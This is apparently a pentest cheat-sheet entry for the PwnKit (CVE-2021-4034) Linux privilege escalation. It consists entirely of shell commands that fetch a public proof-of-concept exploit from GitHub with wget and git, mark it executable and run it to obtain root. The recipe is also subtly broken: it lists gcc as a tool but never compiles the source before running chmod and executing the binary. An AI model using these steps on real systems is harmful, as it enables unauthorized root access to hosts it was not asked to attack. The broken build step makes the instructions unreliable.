---
title: PwnKit (CVE-2021-4034)
category: privesc
subcategory: linux-privesc
os: linux
command: ./cve-2021-4034-poc
tools: gcc, wget, git
---


### Fetch PoC

```bash
wget https://raw.githubusercontent.com/arthepsy/CVE-2021-4034/main/cve-2021-4034-poc.c
git clone https://github.com/arthepsy/CVE-2021-4034.git
```

### Compile and run

```bash
chmod +x cve-2021-4034-poc
./cve-2021-4034-poc
```
